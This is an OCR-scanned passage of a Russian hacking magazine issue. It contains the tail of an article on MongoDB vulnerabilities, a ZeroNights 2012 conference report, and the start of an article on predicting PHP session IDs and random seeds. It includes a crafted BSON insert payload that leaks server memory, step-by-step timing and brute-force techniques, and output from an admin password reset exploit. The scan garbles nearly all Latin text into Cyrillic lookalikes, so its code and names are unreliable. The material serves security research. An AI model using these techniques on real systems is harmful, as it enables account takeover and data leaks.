в «ггвід пог гиппіпд сЬ --гср!$«т. . ок! .| 



Рис. 6. Перехватываем авторизационные данные 



Переменная іаізе успешно перезаписалась в Ігие (рис. 7)! 

Рассмотрим уязвимость в парсере В50М, которая позволяет 
читать произвольные участки памяти. Из-за неправильной об- 
работки длины ВБСШ-документа в имени колонки в команде іпзегі, 
в МопдойВ можно вставить запись, которая будет содержать в себе 
закодированные в Ьазе64 участки памяти сервера БД. Не отступая 
от традиции, сразу попробуем это на практике. 

Предположим, у нас есть таблица с именем сігорте и у нас есть 
права на запись в нее. Отправляем следующую команду и видим 
результат: 

> (1Ь. сігорте. іпзегі({"\х16\х00\х00\х00\х05Ье11о\х00\х010Ѵ 
х00\х00\х00мог1сІ\х00\х00" : "могісі"}) 

> сІЬ.сІгорте.бпсІ() 

{ "_ісГ : ОЬд есіісі ( " 50857а4663944834Ь98еЬ4сс " ) , 

"" : пиіі, 

"Ьеііо" : ВіпОаіа(0, "сІ29уЬСдАААААСРЕААААд/4и35ССРСеуР«-< 
^^к8ААААААААААААМЬс^ААААМ^ААААЕАААВ§сІСІСАААААсАААСбКо0«-■ 
ЗАВмБММААААААААААААААМдЗдАІтАакАддАААЕІАадВиАЕдАѴдВѲАб^ 
ЕАКААхАОЕАОдАзАСІАѴвАгАЕоАсмВаАЕЕАддВВАЕЕАддвВАОѲАІбАрА^ 
АААс1АВ5АРЕААААіАе§А2дВ5АСиАЬмАіАСААОвА§АЕІАадВиАЕдАѴдВ0^ 

АСЕАКААхАОЕАОдАзАС АСкАІ_ААеАСІ- 

АР 6 ==") } 

Все это произошло из-за того, что мы неправильно построили 
объект ВБСМ — указали, что его длина 0x010 вместо 0x01. 

После расшифровки Ьазе64-кода мы получим байты рандомных 
участков памяти сервера. 

ЗАКЛЮЧЕНИЕ 

Будь уверен, выше были описаны атаки и уязвимости, которые 
вполне могут встретиться и в реальной жизни. Проверено на соб- 
ственном опыте. Стоит побеспокоиться не только о безопасном 
написании кода, который работает с МопдоОВ, но еще и об уязви- 
мостях, которые могут присутствовать в самой СУБД. Рассмотрев 
подробно каждый из описанных случаев, следует задуматься, так 
ли безопасны N0501. базы данных, как это принято сейчас считать, 
или это миф? Біау Іипесі! ш 



Боте (аЫе ѵѵііЬ 2 йоситепіз: 




Оиг диегу Іо гіаІаЬазе: 



ж дишинніш.і ч нш.іш '.млышшцуднш ілш 

Ігдесііпд ВЗОМ сіоситеп!, апсі оѵегѵѵгЖпд“І*асІтіп’’ѵаІие: 




Тесііпд: 




Шшт ВЩВШШ ШШЯШ 



Рис. 7. МадісВ5(Ж 



ХАКЕР 01 /168/2013 



065 







взлом 




ДРУГОЕ МЕСТО ВСТРЕЧИ 

Продолжения конференции, которая стартовала 
в Питере в прошлом году, ждали все. Еще за- 
долго до ее старта было известно, что ІегоІМідМз 
в этот раз пройдет в Москве, что вызвало не- 
мало споров, в том числе среди организаторов. 

С одной стороны, добраться до первопрестольной 
большинству участников действительно проще 
(да и значительная часть участников — из Мо- 
сквы]. Однако многих, как и нас, грела идея 
ежегодно устраивать себе небольшое путеше- 
ствие на 2И в северную столицу. Помимо смены 
города проведения, 2его№дМ5 в этом году имела 
другое важное отличие: конференция проходила 
не в один день, а в два! Два дня бесконечного 
общения и докладов на любой вкус, которые 
шли в две параллельные сессии (и это не считая 
воркшопов!]. 



2его№д 

Ерізосіе 0x02 



Еще несколько лет назад можно было лишь завидовать тем 
счастливчикам, которым удается колесить по всяким ВІаскНаГам 
и йекопам и иметь возможность общаться с ведущими 
ресерчерами в области ИБ. И уж тем более невозможно было 
даже представить, что в России будут проходить конференции 



такого уровня, что программе докладов и составу спикеров могли 
бы позавидовать самые авторитетные международные конфы. Но 
в этом мог убедиться каждый, кто побывал на 2егоІ\Іід№5 2012. 



УВИДЕТЬ ВСЕХ 

Сказать по правде, попасть в зал удалось 
не сразу. На входе мы встретили столько знако- 



066 



ХАКЕР 01 /168/2013 



ЕегоМдМз 2012 




мых людей, с которыми хотелось пообщаться, 
что пришлось пожертвовать даже интересней- 
шим кеупоіе'ом (ничего, выступление ТЬе Сгидц, 
который открывал 2егоІ\ІідНіз, можно найти 
на ѴоиТиЬе). Тусовка людей, занимающихся 
практической безопасностью, довольно неболь- 
шая, и в этом всегда убеждаешься на подобных 
мероприятиях. Но в этот раз было и немало 
новых людей. Некоторые не только с интересом 
слушали хардкорные доклады, но и умудрялись 
умело потроллить бывалых спикеров :). 

Несмотря на платное участие, народа было до- 
вольно много. В некоторые залы, особенно по по- 
пулярным ѵѵогкзЬор'зм, было не протолкнуться. 

И даже на площадке для свободного общения, где 
было немало столов, всегда было полно людей, 
которые что-то делали в своих ноутах. Казалось, 
что у каждого второго был запущен Кізтеі :). 
После просмотра списка хотспотов с явно кучей 
левых точек доступа и объявлениями о продаже 
О-бау в 55Ю приходило единственное верное ре- 
шение: «Отключить ѴѴі-Рі от греха подальше!» :). 

ЧТО БЫЛО? 

Помимо двух сессий с докладами, параллельно 
шли интересные воркшопы. Леша Синцов на про- 
тяжении всего второго дня конференции прово- 
дил воркшоп по разработке сплоитов для ѴѴіп7 
(х32) — причем после вечеринки для спикеров :). 
Арсений Реутов, Тимур Юнусов, Дмитрий Нагибин 
провели отличный воркшоп по инструментам 
для реализации атак на генераторы (читай статью 
в этом номере). Использование ВеЕР, атаки 
на ХМЦ безопасность ВРЮ, реверсинг банковско- 
го трояна, защита от ОйоБ — каждый мог найти 
воркшоп по душе. 

В завершение первого дня все изрядно по- 
веселились во время круглого стола «Бесигііу 
РезеагсЬегз ѵз. йеѵеіорегз», где небезызвест- 
ный ВоЬик (директор по распространению 
технологий в Яндексе и ведущий Рабіо-Т) трол- 
лил ресерчеров из ѴіаРогепзісз, ІМокіа, Уапбех 



и Ооодіе, что бизнесу они, по правде говоря, 
не нужны в отличие от разработчиков, которые 
создают продукт, приносящий деньги. В итоге 
получилась бодрая дискуссия, которая нам до- 
ставила немало удовольствия. 

РА5ТТРАСК И КВЕСТЫ 

Сессия РазіТгаск'а с короткими, 15-минутными 
выступлениями традиционно прошла на ура: 
быстро меняющиеся, емкие доклады на самые 
разные темы — тут не заскучаешь. Напри- 
мер, Александр Песляк [он же Боіаг йезідпег, 
разработчик -ІоЬп ТНе Віррег) рассказал о том, 
как можно усложнить вычисление хеша за счет 
использования большого количества оперативки 
(подход «зесигііу іЬгоидЬ оЬеэіІу»). 



Само собой, не обошлось без конкурсов, был 
в том числе хак-квест от Ыокіа, объединивший 
виртуальные флаги с заданиями в реальной 
жизни. Леша Синцов написал про него такой 
огромный текст, что мы не смогли поставить его 
в этом номере — опубликуем в следующем. 

ВЕ5РЕСТ 

Ниже тебя ждет описание докладов и слово 
организаторов — ребят из Рідііаі Зесигііу. 
Парни, вы делаете бриллиантовую работу! 
Огромный респект за организацию подобных 
ивентов, за то, что двигаете область практиче- 
ской безопасности вперед, причем не только 
в России, но и вообще в мире. Мы всегда рады 
поддержать вас. 




ХАКЕР 31 /168/2013 



067 




взлом 



СЛОВО ОРГАНИЗАТОРОВ 



ДОКЛАДЫ 



О своих впечатлениях я попросил рас- 
сказать тех людей, которые создавали 
2егоЫідИ(5, правда, уже накануне сдачи 
номера в печать. Саша Поляков, явно наме- 
кая, что мы негодяи, поскольку не спросили 
его об этом на аКеграгІу (тогда и уместнее, 
и приятнее), все же согласился написать 
несколько слов :). 

«Ура! Конференция прошла, и мы с радо- 
стью готовы сообщить вам: «Это было круто». 

На самом деле, когда мы делали конференцию 
во второй раз, в новом для нас городе, с двух- 
дневной массивной программой и новыми 
партнерами, — это с самого начала оказалось 
непростой задачей. Не буду перечислять все 
тонкости и трудности, но, к счастью, у нас это 
получилось, и объективно лучше, чем в про- 
шлом году, хотя, к сожалению, исправив ляпы 
предыдущего года, мы добавили немного 
новых. 

Все наше внимание было сосредоточено 
на программе, которую хотелось сделать 
максимально технической: не только чтобы 
не было общих докладов, но и чтобы все 
были предельно хардкорными или хотя бы 
раскрывали какую-то новую тему в ИБ, о 
которой либо было крайне мало информации 
или ее не было вовсе. С этой частью, мне 
кажется, мы справились на ура, и за это надо 
поблагодарить программный комитет, жестоко 
отбрасывающий все, что казалось неподходя- 
щим. Конечно же, пара докладов из более чем 
сорока, если считать все виды выступлений, 



все же не дотягивали по уровню, но все равно 
это крайне крутой результат. Скажу по своему 
опыту: последние конференции, которые я 
недавно посещал в Европе, дай бог давали на 
выходе 2-3 интересных доклада — тогда как у 
нас даже на Разі Тгаск были изюминки. 

Отдельное спасибо, конечно же, хочется 
сказать спонсорам и партнерам, но самое 
главное спасибо — участникам за то, что 
поверили и поддержали нас в этом нелегком 
деле, в результате чего конференция почти 
окупилась. В следующем году мы сделаем 
все возможное, чтобы не опустить высокую 
планку докладов и больше внимания уделить 
неформальной части и атмосфере. Хотя и в 
этот раз неформальные тусовки — вечеринки 
спикеров под диджея из РЬепоеІіІ, одно- 
временно являющегося и спикером, а также 
аКеграгІу после конференции — были класс- 
ными и позволили наконец-то пообщаться 
с кучей народу, чего на самой конференции 
сделать так и не удалось. 

Мы считаем своей миссией поощрение 
практических исследований защищенности 
технологий, незримо присутствующих в жизни 
каждого человека, а также широкое распро- 
странение информации о технологиях взлома 
и защиты и воспитание нового поколения 
специалистов, способных поднять реальную 
безопасность российских технологических 
систем на новый уровень, чтобы Россия была 
известна не кибепреступниками, а крутыми 
исследователями». 




ЖЕВ 

«АТАКИ 55РР И СОКЕТЫ: ШВЕДСКИЙ СТОЛ 
УЯЗВИМОСТЕЙ» Одна из наиболее трендовых 
тем сегодня — уязвимости серверной подделки 
запроса (Бегѵег Бісіе Вецие5І Рогдегу — 55РР), 
и ее мастерски представили Владимир Воронцов, 
Александр Головко, показав несколько впечат- 
ляющих техник для проведения атак в реальных 
веб-приложениях. 

«УДАР ПО МОИСООВ» N0501 базы данных ста- 
новятся очевидным трендом: они используются 
в любом высоконагруженном проекте. И МопдоЭВ 
в этой области является одним из безапелляци- 
онных лидеров. Михаил Фирстов наковырял баги 
в СУБД, рассказал о них на 2М и теперь напи- 
сал материал для нас (читай его статью в этом 
номере). 

«В МИРЕ БЕЗГРАНИЧНЫХ ВОЗМОЖНОСТЕЙ 
Я СТАЛ ВАН7ВККЮНѴ22ХЭРАѴѴ06062РѴ(Ж6» 

Докладов по безопасности приложений на РиЬу 
оп Раііз пока немного, поэтому послушать 
регпсНеп из РЬепоеІіІ было весьма любопытно. 
Докладчик рассказал про типичные недостатки 
в системах аутентификации и реализации, сделав 
экспресс-экскурс во внутреннюю кухню приложе- 
ний на РоР. 

«ВОТ ЗА ЧТО Я ЛЮБЛЮ ВЗЛОМЫ ХМЫ» Кажется, 
Ыісоіаг бгедоіге заставил всех полюбить взлом 
ХМЦ рассказав немало практически применимых 
техник, приводящих атаку до РСЕ через 501-. 

НАМСОКЕ 

«О ФАЗЗИНГЕ ПОДРОБНО И СО ВКУСОМ» 

Докладчики из Финляндии — АКе КеНипеп, 
МіаиЬіг — очень зажигательно рассказали о том, 
как они обустраивали процесс фаззинга Ріге(ох 
и СЬготе. Весь доклад — набор готовых рецептов 
для отслеживания сбоев и поиска уязвимостей. 
«УЯЗВИМОСТИ ПОДСЧЕТА ССЫЛОК В ЯДРЕ 
ѴѴІЫ00ѴѴ5: ПРАКТИЧЕСКИЙ АНАЛИЗ» За корот- 
кое время доклада Маіеизг «рОги» Эигсгук сумел 
привести анализ большого количества векторов 
атаки на счетчики ссылок в ядре. При этом в каж- 
дом случае автор рассказывал, как избежать 
подобных и$е-аКег-(гее уязвимостей. 

«ТНЕ АРТ ОР ВШАРУ йІРРІЫС ОР НОѴѴ ТО РІЫй 
0-ОАУ2 РОР РРЕЕ» Как разработать сплоит 
для уязвимости, если в распоряжении есть патч, 
который ее исправляет? О секретах такого подхо- 
да рассказал Никита Тараканов (спойлер: очень 
скоро у нас будет материал на эту тему). 
«ИСТОРИЯ О НЕСУЩЕСТВУЮЩИХ УЯЗВИМО- 
СТЯХ НУЛЕВОГО ДНЯ, СТАБИЛЬНЫХ ЭКС- 
ПЛОЙТАХ ДЛЯ БИНАРНЫХ ПРИЛОЖЕНИЙ 
И ПОЛЬЗОВАТЕЛЬСКОМ ИНТЕРАКТИВЕ» Этот 
доклад прочитала единственная докладчица кон- 
ференции. Алиса Шевченко показала, что даже 
из «баянов» можно извлечь немало профита, 
рассказав, в частности, о нестандартном подходе 
к эксплуатации техники ОН Нуаскіпд. 



068 



ХАКЕР 01 /168/2013 




2егоІЧідМ5 2012 




«ОБРАТНЫЙ АНАЛИЗ И РЕКОНСТРУКЦИЯ 
ОБЪЕКТНО-ОРИЕНТИРОВАННОЙ АРХИТЕКТУ- 
РЫ 1Л/ІЫ32/РІ.АМЕР» Уже родные докладчики 
конференций Саша Матросов и Женя Родионов 
рассказали о трудностях во время реверсинга 
РІатег'а и как удалось упростить себе жизнь 
с помощью Нех-Рау5. 

«ПРИКЛАДНАЯ АНТИФОРЕНЗИКА: РУТКИТЫ, 
УЯЗВИМОСТИ ЯДРА И ВСЕ-ВСЕ-ВСЕ» Дмитрий 
Олексюк поведал об интересном векторе 
сокрытия вредоносного кода. Сокрытие реали- 
зовано через ОіКегепІіаІесІ Бузіет Оезсгірііоп 
ТаЫе (050Т) — одну из ключевых таблиц, кото- 
рая хранится в реестре и используется АСРІ. 



МОВИЕ 

«МІТМ-НАПАДЕНИЕ НА 105. ТЕХНИКА И ПО- 
СЛЕДСТВИЯ» Алексей Трошичев развил свое 
исследование, которое мы публиковали в #07/12 
номере, «і2отЬіе, или вкус чужих яблок» и рас- 
сказал о модифицированном варианте при- 
нуждения пользователя к установке корневого 
сертификата, раскрытии ББЬтрафика и удален- 
ном управлении Ю5-девайса. 

«ТЕМНАЯ И СВЕТЛАЯ СТОРОНА (НЕБЕЗОПАС- 
НОСТИ ІСІ_01Ю» Дима Скляров и Андрей Беленко 
решили разобраться, как Юоисі, который исполь- 
зуют многие яблочные девайсы, шифрует бэкапы, 



и убедились, что их шифрование (в отличие 
от шифрования офлайновых бэкапов) практи- 
чески не является препятствием. При этом сами 
бэкапы хранятся в облаке не Арріе, а на серверах 
Аіиге и Атагоп. 

«ЗА КУЛИСАМИ АЙОВОЮ: ВАРИАНТЫ АТАКИ 
И РАДИКАЛЬНЫЕ МЕРЫ ЗАЩИТЫ» Хороший, 
многосторонний доклад про защиту Апбгоісі, где 
автор показал как различные фейлы безопасно- 
сти, так и интересные штуки о том, как можно эту 
безопасность укрепить (например, примонтиро- 
вав криптоконтейнер внутри ОС на случай потери 
телефона). 

РАЗНОЕ 

«ОСОБЕННОСТИ БЕЗОПАСНОСТИ А05-В 
И ДРУГИХ ВОЗДУШНЫХ ТЕХНОЛОГИЙ» Один 
из наиболее запомнившихся докладов, который 
так впечатлил, что уже через 15 минут после вы- 
ступления мы договорились с Андреем Костиным, 
что напишем по мотивам доклада тему номера. 
Надеюсь, ты ее уже прочитал. 

«СОПРОТИВЛЕНИЕ БЕСПОЛЕЗНО: ВЗЛОМ БЕС- 
ПРОВОДНЫХ СИГНАЛИЗАЦИОННЫХ СИСТЕМ» 
Привычная картина: многие разработчики 
оборудования, в том числе для зесигііу, не со- 
блюдают элементарные правила безопасного 
кода. ВаЬак ^ѵасіі показал это на примере 
сигнализаций. 

«НИ ЗАМКОВ, НИ ЗАСОВОВ: ВЗЛОМ ИНФРА- 
СТРУКТУРЫ ОРЕИАМ» Интересный доклад 
от Андрея Петухова и Георгия Носеевича, 
в котором рассматривается распространенная 
система управления доступом РогдеРоск ОрепАМ 
с точки зрения защищенности от атак со стороны 
внешнего злоумышленника. 

«БЕЗОПАСНОСТЬ СОВРЕМЕННЫХ ПЛАТЕЖНЫХ 
ТЕХНОЛОГИЙ: ЕМѴ, ЫРС, ЕТС.?» Настоящая 
лекция от Никиты Абдуллина о том, как прохо- 
дит процессинг кредитных карт, каким образом 
он защищен и какие проблемы создает переход 
на бесконтактные карты с МРС-чипом. 

«КАК БЫ Я АТАКОВАЛ КОРПОРАТИВНУЮ 
СЕТЬ КРУПНОЙ КОРПОРАЦИИ» Саша Поляков, 
у которого уже 99 ІеѵеІ в выступлениях, рассказал 
об интересном векторе атаки крупной компании. 
Кажется, основанного на собственном опыте. нс 




ХАКЕР 01 /168/2013 



069 



взлом 






_ 



л 


Арсений Реутов |НМр://га20г.пате, агеиіоѵгарііесигйу.гиі. 
Тимур Юнусов {(уипизоѵгарівесигііу.ги), Дмитрий Нагибин (ОпадіЬіпОрІвесигіІу.ги) Ро$і(іѵе ТесНпоІодіез 


' 1 




.. ' 1 


НОВЫЕ СПОСОБЫ 


і/ 


АТАК НА ГЕНЕРАТОРЫ 


1 


ПСЕВДОСЛУЧАЙНЫХ 


Я 


ЧИСЕЛ В РНР 



Доклад 

ЧМ 



ПРЕДСКАЗАНИ 

СБЫВАЮТСЯ 




Вся информация 
предоставлена 
исключительно 
в ознакомительных 
целях. 

Ни редакция, ни ав- 
тор не несут ответ- 
ственности за любой 
возможный вред, 
причиненный ма- 
териалами данной 
статьи. 



Если говорить о языках с небезопасным 
подходом к генерации псевдослучайных 
значений, то в первую очередь на ум приходит 
РНР. Первый дубль эпопеи РНР с рандомными 
числами имел место более пяти лет назад, 
однако с тех пор мало что изменилось. 

А свежие исследования, вместе с нежеланием 
разработчиков что-либо менять, ставят под 
угрозу практически каждое веб-приложение, 
использующее стандартные средства 
интерпретатора. В этой статье ты узнаешь 
о новых способах атак на генераторы 
псевдослучайных чисел в РНР на примере 
популярных веб-приложений. 




Проблемы веб-приложений на РНР, связанные с генерацией 
псевдослучайных чисел, были известны достаточно давно. Еще 
в 2008 году Стефан Эссер (Біеіап Еззег) указал на недостатки руч- 
ной инициализации генератора случайных чисел и описал общий 
алгоритм атак через кеер-аііѵе НТТР-запросы. Если на тот момент 
все уязвимости, связанные с предугадыванием различного рода 
токенов, в том числе для восстановления пароля, можно было спи- 
сать на сами веб-приложения (из-за неправильного использования 
возможностей РНР и утечек состояния ГПСЧ), то со временем стали 
выявляться недостатки самого интерпретатора. 



В 2010 году Милен Рангелов (Мііеп Рапдеіоѵ) представил РоС 
для создания гаіпЬо\л/-таблиц, позволяющих проводить поиск 
сида по полному диапазону из всех (2 А 32) возможных значений. 
Иначе говоря, имея код, который, например, генерирует случай- 
ным образом пароль, стало возможным заранее сгенерировать 
таблицы и по ним достаточно быстро искать сид под конкретное 
веб-приложение на РНР. Спустя полгода на конференции ВІаск 
Наі Сэми Камкар (Баллу Кагпкаг) впервые указал на проблемы РНР 
с генерацией идентификаторов сессий. Летом этого года на той же 
конференции греческие эксперты в области криптографии Джордж 
Аргирос (беогде Агдугоз) и Агелос Кияиас (Аддеіоз Кіауіаз) высту- 
пили с работой, в которой была еще глубже проанализирована вся 
подноготная генерации псевдослучайных чисел в РНР и представ- 
лены абсолютно новые методы и техники атак на веб-приложения. 
В частности, шла речь о брутфорсе РНР5Е55Ю с целью получе- 
ния информации о состояниях источников энтропии ГПСЧ в РНР, 
однако практическая реализация отсутствовала. Мы же решили 
проверить всю теорию, провести собственные исследования и соз- 
дать необходимые инструменты. Новый взгляд на старые вещи 
позволил выявить уязвимости в таких продуктах, как ОрепСаП, 
ОаІаЫ^е Епдіпе, ІІМІ.СМ5 последних версий. 

Одна из новых техник такова: атакующий создает свежие процессы 
с вновь инициализированным состоянием ГПСЧ, что позволяет 
эффективно искать сиды. Прежде чем перейти к разбору нового 
способа, необходимо разобраться с особенностями взаимодей- 
ствия РНР и АрасЬе. 

Веб-сервер может использовать один из модулей параллельной 
обработки (тиІ1і-ргосе55Іпд тогіиіе, МРМ): обычно это либо трт- 
ргеіогк, либо трт-ѵѵогкег. Что касается рге^огк-модуля, смысл 
его работы в том, что заранее создается некоторое количество 
процессов веб-сервера и каждое соединение с веб-сервером 
обрабатывается одним из этих процессов. В режиме трт-ѵѵогкег 



070 



ХАКЕР 01 /168/2013 



Предсказания сбываются 



” рЬр$е$$іс!_си<]а 

Ж)М СРЦ = 2 " 

І^ЕС = 33732 

ТІМЕ = 0.001707796 псз <СОЬ = 524288> 
ТОТЙЬ = 524287475712 зеесі 
8РЕЕ0 = 1171100230.12 п/зес 
ЕТА = 432 зес 



м 



№ 



Брутфорс РНР5Е55Ш на 6РУ Атагоп'а 



пипЬеі* зеегі 2 оЕ 2 
ІІ8ЕС = 1000000 

ТІМЕ = 0.016523405 тз <СОЬ = 131072> 
8РЕЕВ = 15865010435.62 п/зес 
ЕТА = 0 зес 

СРІШ : ЖЖ = 29 
СРІЛ : ЖЖ = 33 



М 



Брутфорс ендов І.С6 по сиду Мегзеппе Тѵѵівіег 



АрасЬе обрабатывает запросы не в отдельных процессах, а в пото- 
ках КНгеасІз) внутри одного процесса. Забегая вперед, необходимо 
сказать: в *піх-системах идентификатор потока может иметь 2 А 32 
значений, что делает перебор РНР5Е55Ш невозможным. Однако 
в большинстве случаев атакующий имеет дело с классической 
связкой АрасЬе трпл-ргеЬэгк + тосІ_рЬр. При такой конфигурации 
кеер-аііѵе запросы будут обрабатываться одним и тем же процес- 
сом, то есть с общим состоянием ГПСЧ. В режиме РНР-С6І для каж- 
дого запроса создается новый процесс интерпретатора с вновь 
инициализированными состояниями генераторов. 

В упомянутой работе Стефана Эссера для получения новых 
процессов со свежими сидами предлагался радикальный метод, 
а именно крэшить веб-сервер с помощью многочисленных вложен- 
ных 6ЕТ, Р05Т, Соокіе-параметров. Джордж Аргирос и Агелос Кия- 
иас предложили более гуманный способ. Суть его в том, что атаку- 
ющий создает большое количество кеер-аііѵе соединений, пытаясь 
загрузить работой все запущенные процессы веб-сервера. Задача 
атакующего — отправить целевой запрос, после того как у АрасЬе 
закончатся свободные процессы и он начнет создавать новые. 

СИНХРОНИЗАЦИЯ ВРЕМЕНИ 

Одним из источников энтропии для генерации РНР5Е55Ю является 
значение микросекунд. Как известно, веб-сервер перед отправкой 
ответа добавляет заголовок йаіе, через который можно узнать 
время завершения выполнения запроса вплоть до секунд. Несмо- 
тря на то что микросекунды неизвестны атакующему, следующая 
техника может помочь снизить диапазон их возможных значений: 

1. Ждем обнуления микросекунд на клиенте (т$ес=0), после чего 
делаем задержку гіеііа (вначале беІ*а=0). 

2. Отправляем первый запрос и ждем ответа, фиксируем время 

на сервере с помощью заголовка йаіе (Т1) и микросекунды на кли- 
енте (тзес=т1). 

3. Сразу же отправляем второй запрос и ждем ответа, фиксируем 
время на сервере (Т2) и микросекунды на клиенте (твес=т2). 



5 • • р»@иЬигЛи: - /жогкзНор 

Гііе ЕЛІ Ѵіе* Т&гтіпаІ Неір 

рКЗиЬипІи: с<1 ыогк$Гіор/ 

рІ@иЬипіи:-/ыогк&Ьор$ 1л 

ехріоіи Ьа&НсаІ .роі $ее<І 5 .т ІооЬ 

рЦЭиЬигПи: ~/*огк$Ьор$ рНр ехрІ0ІІ5/<11е/<11е.рЬр 

ОІ.Е < 9.6 Адівіп Ра5$ Ке$еі Ехріоіі 

Ц$Е ехрІот/сІІе/<Ле.рЬр <ѴАІЛ0 Ц$ЕК РНР5Е55І0> <САРТСНА 5Е$5І<Ж> <САРТСНА>рі 
2аааѲЗа1Ѳ і скгі<12е2Ѳ8228558с1а7(8Ь5 Иѵ$гарЬр Т34аа818е1ае1Ьегі44130ѲѲ2І97аЬ5Ь6 

ОІЕ <9.6 Агіяіп Ра$5 Яе$еІ Ехріоіі 

Бепсііпд геяиеЯ 1,2 

Ріпй Токет^еу^ухди’ ; Ті*е=1352572243 

ЕІМО 5ЕЕР: 724548 КЕ5Т ТОКЕЯ=568892(171427Ь<М9еЬЬ44ѲѲ196Ь7еѲ93б4Ѳа4а17 
5еш1іпд гечиея 3,4 

Гт.гі Токеп? -'Шіікіи- 

рІ@иЬипіи:~/ѵл)гк$6ор$ [] 



Удачная атака на ОаІаЫ^е 



4. Еслисекунды несменились(Т2-Т1 = 0),тодобавляем кбеКазна- 
чение<(т2- т1)/2 (чем меньше шаг беііа, тем лучше) и возвраща- 
емсякшагуі. 

5. Еслисекунды при одинаковых беііа стабильно меняются (Т2-Т1 * 
1),то мы добилисьситуации, когда междузапросами микросекун- 
ды обнуляются. 

По описанному выше алгоритму микросекунды второго запроса 
находятся в интервале [0; |гп2 - т1)/2]. 

Так как веб-сервер добавляет заголовок йаіе непосредствен- 
но после обработки запроса, задача атакующего — максимально 
снизить время обработки первого запроса. Для этого запрашива- 
ется несуществующая страница, в результате чего время начала 
обработки запроса практически совпадает со временем в заго- 
ловке йаіе. Второй же запрос является целевым — в нем и должна 
создаваться сессия в свежем процессе. 

Очевидно, что чем больше времени проходит с момента отправ- 
ки запроса до момента получения заголовков ответа, тем больше 
интервал микросекунд. 

ПАРНЫЕ ЗАПРОСЫ 

Суть техники заключается в последовательной отправке двух 
запросов с максимально низкой задержкой между ними. Предпо- 
лагается, что у атакующего есть возможность узнать микросекунды 
из первого запроса (например, с помощью восстановления пароля 
аккаунта атакующего в целевой системе). Делая первый запрос 
и определяя значение микросекунд в момент его обработки, мы мо- 
жем уменьшить интервал значений микросекунд второго запроса. 

Владимир Воронцов ((ЭгіОгпрр) предложил отправлять три за- 
проса, где микросекунды первого и последнего известны атакую- 
щему. В этом случае диапазон микросекунд второго запроса будет 
ограничен известными значениями. 

БРУТФОРС РНР5Е55Ю 

В своей работе Сэми Камкар рассматривал саму возможность 
брутфорса РНР8Е55Ю. Исследование греков показало, что про- 
цесс брутфорса можно оптимизировать, а полученную информацию 
использовать для предугадывания сидов ГПСЧ в РНР. 

Обратимся к коду генерации РНР5Е55Ю: 

зрргіпІ^&Ьи-Р, 0, "% . 15$Х1сІ%1сІ%0 . 8Р " , гетоТе_асІсІг ? 
гето*е_а<Мг : 1ѵ.Тѵ_5ес, (Іоп^ Іп1)1:ѵ.1ѵ_и5ес, ♦-* 

рЬр_сотЬіпесі_1сб(Т5РМІ.5_С) * 10 ); 

Пример исходной строки: 127.0.0.11351346648192088.00206033. 
Если разобрать ее на составные части, можно выделить следую- 
щие: 

• 127.0.0.1 — ІР клиента; 

• 135134664— Іітезіатр; 

• 819208 — микросекунды (обозначим какті); 

• 8.00206033 — вывод генератора ІС6(І_іпеагСопдгііепІіаІ 
Сепегаіог, линейный конгруэнтный генератор). 



ХАКЕР 01 /168/2013 



071 



взлом 



При вызове рЬр_сотЬіпес1_Ісд в свежем процессе РНР произво- 
дит инициализацию генератора 1.С6: 

І.се(5і) = *ѵ.*ѵ_зес Л (*ѵ.1ѵ_изес<<11); 



1СЪ(з2) = (1оп§) ее^рі^Оі 

/* АсІсІ епТгору -Со з2 Ьу саіііпе §еТ1:ітео-РсІау() а§аіп */ 
1_СС(з2) л = (*ѵ.1:ѵ_и5ес<<11); 

При генерации сидов 5І и б 2 участвует тот же Іітезіатр, иден- 
тификатор текущего процесса (2 Л 15 возможных значений), а также 
два новых замера микросекунд (обозначим как т2 и тЗ). 

ІР и Іітезіатр известны атакующему, таким образом, остаются 
следующие значения: 

• микросекунды ті (10 Л 6 значений); 

• разница между вторым и первым замерами времени (т2 - ті), 

причем на большинстве систем она не превышаетчетырех микро- 
секунд; 

• разница между третьим и вторым замерами времени (тЗ - т2), 

обычно не превышаеттрех микросекунд; 

• идентификатор процесса (32 768 значений). 

РНР5Е55Ю может представлять собой Мй5- либо БНА-1-хеш, 
но в большинстве случаев это первый вариант. Также представле- 
ние хеша может зависеть от директивы конфигурации РНР зеззіоп. 
ЬазЬ_ЬіІ 5 _рег_сЬагасІег, которая особым образом преобразует 
идентификатор. Однако восстановить оригинальный хеш не со- 
ставляет труда, так как все операции обратимы. 

Необходимо заметить, что в РНР 5.4+ при генерации сессий 
по умолчанию используются внешние источники энтропии, в част- 
ности /сіеѵ/игапсіот. Но к счастью, живые веб-серверы на данный 
момент довольно редко используют новую ветку РНР. 

Существуют способы, которые могут помочь при бруте 
РНР5Е55Ю. Например, если на целевом веб-сервере установлен 
тос1_зІаІиз, то при обращении по /зегѵег-зіаіиз можно получить 
идентификаторы запущенных процессов АрасНе. А если атакую- 
щему удалось обнаружить рЬріпІо, то из переменной окружения 
1)МЮІІЕ_Ю, которую устанавливает модуль АрасЬе тосі_ипідие_ісі 
для идентификации запроса, можно извлечь не только РЮ, 
но и значение микросекунд. Владимир Воронцов создал онлайн- 
декодер ШЧЮ1)Е_Ю, доступный по адресу: ЬЦрз://с1еѵ.оп5ес.ги/ 
гапсіз . 

Очевидно, что перебор РНР5Е55Ю требует специального 
инструмента, так как стандартные средства в данном случае 
не помогут. Поэтому мы разработали собственное решение под 
названием РНР5Е55Ю Вгиіеіогсег, которое показало на практике 
впечатляющие результаты. 

Главное достоинство инструмента — высокая скорость, которая 
достигается благодаря переносу расчетов на 6РІІ. На одном ОРСІ- 
инстансе с СІЮА сервиса Атагоп нам удалось достичь скорости 
в 1,2 миллиарда хешей в секунду, что позволяет перебрать весь 
диапазон значений за 7,5 минуты. Помимо этого, в программе 
присутствует поддержка распределенных вычислений с умным 
балансировщиком нагрузки. Объединив несколько машин с 6Р1), 
можно добиться невероятно высокой скорости. Более подробное 
описание инструмента ищи в рубрике Х-Тооіз, а сам дистрибутив — 
на ОѴй. 

В результате успешного брутфорса РНР5Е55Ю атакующий по- 
лучает значения, позволяющие выяснить сиды зі и з2 генератора 
І_С6, таким образом у него появляется возможность предугадывать 
все последующие значения. Но самое главное — это то, что стано- 
вятся известными все данные для вычисления сида, использующе- 
гося для инициализации Мегэеппе Тѵѵізіег: 

#і-РсІе-Р РНР_ЫІМ32 

#с!ебпе СЕМЕКАТЕ_5ЕЕО() (((1оп§) (*іте(0) * щ 




Брутфорс РНР5Е55Ш на СРІІ 

бе*Сиггеп*РгосеззІсІ())) Л ((1оп§) (1000000.0 * *-< 
рЬр_сотЬіпес!_1с§(Т5КМ15_С) ) ) ) 

#е1зе 

